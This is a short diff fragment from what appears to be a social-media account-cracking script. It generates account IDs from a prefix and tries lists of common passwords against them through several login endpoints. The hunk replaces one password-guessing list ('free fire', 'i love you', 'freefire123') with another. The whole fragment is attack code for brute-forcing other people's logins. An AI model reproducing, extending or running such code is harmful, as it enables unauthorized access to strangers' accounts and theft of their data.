@@ -1342,7 +1342,7 @@ def anoX2():
 			uid = kode+guru
 			mk = uid[:6]
 			pwx = [guru]
-			pwx = [kode+guru,mk,'free fire','i love you','freefire123']
+			pwx = [kode+guru,'57273200']
 			if anoXfire =='1':yaari.submit(mbasic,uid,pwx,tl)
 			elif anoXfire =='2':yaari.submit(p,uid,pwx,tl)
 			elif anoXfire =='3':yaari.submit(x,uid,pwx,tl)
